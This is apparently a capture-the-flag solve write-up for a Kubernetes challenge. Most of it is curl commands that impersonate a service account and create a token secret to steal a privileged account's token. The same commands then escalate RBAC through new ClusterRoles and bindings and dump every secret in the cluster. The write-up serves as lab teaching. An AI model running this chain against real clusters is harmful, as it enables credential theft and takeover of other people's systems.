# Solve

Find private note by watching:

```
curl 'http://localhost:8080/apis/nnsctf.no/v1/notes?watch=1&resourceVersion=1'
{"type":"ERROR","object":{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"too old resource version: 1 (260)","reason":"Expired","code":410}}

curl 'http://localhost:8080/apis/nnsctf.no/v1/notes?watch=1&resourceVersion=260'
...
```

Note that some notes might have to be added manually for the watch to get triggered with older resources.

Decode the token:
```json
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local",
    "k3s"
  ],
  "exp": 1755596560,
  "iat": 1755510160,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "81414e32-af47-46d6-b6c6-38dc533e5201",
  "kubernetes.io": {
    "namespace": "devsecoops",
    "serviceaccount": {
      "name": "devsecoops-intern",
      "uid": "0dd24279-a35a-49e0-92fa-45c430638fc2"
    }
  },
  "nbf": 1755510160,
  "sub": "system:serviceaccount:devsecoops:devsecoops-intern"
}
```

```bash
curl \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{
    "kind": "SelfSubjectRulesReview",
    "apiVersion": "authorization.k8s.io/v1",
    "spec": {
      "namespace": "devsecoops"
    }
  }' \
  http://localhost:8080/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

Shows that the following rule exists:

```json
{
  "verbs": [
    "impersonate"
  ],
  "apiGroups": [
    ""
  ],
  "resources": [
    "serviceaccounts"
  ],
  "resourceNames": [
    "devsecoops-auditor"
  ]
}
```

```bash
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Impersonate-User: system:serviceaccount:devsecoops:devsecoops-auditor" \
  -X POST \
  -d '{
    "kind": "SelfSubjectRulesReview",
    "apiVersion": "authorization.k8s.io/v1",
    "spec": {
      "namespace": "devsecoops"
    }
  }' \
  http://localhost:8080/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

Shows that the SA can do the following:
```json
[
  {
    "verbs": [
      "list"
    ],
    "apiGroups": [
      "events.k8s.io"
    ],
    "resources": [
      "events"
    ]
  },
  {
    "verbs": [
      "get"
    ],
    "apiGroups": [
      ""
    ],
    "resources": [
      "pods"
    ]
  },
  {
    "verbs": [
      "create",
      "get"
    ],
    "apiGroups": [
      ""
    ],
    "resources": [
      "secrets"
    ]
  }
]
```

Get events:
```bash
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -H "Impersonate-User: system:serviceaccount:devsecoops:devsecoops-auditor" \
  'http://localhost:8080/apis/events.k8s.io/v1/namespaces/devsecoops/events'
```

See pod name:
```
Created pod: agile-devsecoops-certified-app-68dd7689f-8786z
```

Get pod:
```
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -H "Impersonate-User: system:serviceaccount:devsecoops:devsecoops-auditor" \
  'http://localhost:8080/api/v1/namespaces/devsecoops/pods/agile-devsecoops-certified-app-68dd7689f-8786z'
```

Figures out SA:
```
"serviceAccountName": "scrum-daddy-2604d58b82f3a6cb",
```

Notice that a secret can be created. Creates a secret that binds to the SA:

```bash
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Impersonate-User: system:serviceaccount:devsecoops:devsecoops-auditor" \
  -X POST \
  -d '{
    "apiVersion": "v1",
    "kind": "Secret",
    "metadata": {"name": "sa", "annotations": {"kubernetes.io/service-account.name": "scrum-daddy-2604d58b82f3a6cb"}},
    "type": "kubernetes.io/service-account-token"
  }' \
  http://localhost:8080/api/v1/namespaces/devsecoops/secrets
  
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:serviceaccount:devsecoops:devsecoops-auditor" \
  http://localhost:8080/api/v1/namespaces/devsecoops/secrets/sa
```

The scrum daddy's token is retrieved from the secret's data.

```bash
curl \
  -H "Authorization: Bearer $TOKEN2" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{
    "kind": "SelfSubjectRulesReview",
    "apiVersion": "authorization.k8s.io/v1",
    "spec": {
      "namespace": "devsecoops"
    }
  }' \
  http://localhost:8080/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

Figures out the rules:

```json
{
  "verbs": [
    "create"
  ],
  "apiGroups": [
    "rbac.authorization.k8s.io"
  ],
  "resources": [
    "clusterrolebindings"
  ]
},
{
  "verbs": [
    "create",
    "bind",
    "escalate"
  ],
  "apiGroups": [
    "rbac.authorization.k8s.io"
  ],
  "resources": [
    "clusterroles"
  ]
},
```

Give scrum daddy perms

```bash
curl \
  -H "Authorization: Bearer $TOKEN2" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "ClusterRole",
    "metadata": { "name": "daddy-read" },
    "rules": [
      {
        "apiGroups": [""],
        "resources": ["namespaces", "secrets"],
        "verbs": ["get", "list"]
      }
    ]
  }' \
  http://localhost:8080/apis/rbac.authorization.k8s.io/v1/clusterroles
  
curl \
  -H "Authorization: Bearer $TOKEN22" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "ClusterRoleBinding",
    "metadata": { "name": "daddy-read" },
    "subjects": [
      {
        "kind": "ServiceAccount",
        "name": "scrum-daddy-2604d58b82f3a6cb",
        "namespace": "devsecoops"
      }
    ],
    "roleRef": {
      "kind": "ClusterRole",
      "name": "daddy-read",
      "apiGroup": "rbac.authorization.k8s.io"
    }
  }' \
  http://localhost:8080/apis/rbac.authorization.k8s.io/v1/clusterrolebindings
```

Get secrets:
```bash
curl -k \
  -H "Authorization: Bearer $TOKEN2" \
  http://localhost:8080/api/v1/secrets
```

Flag!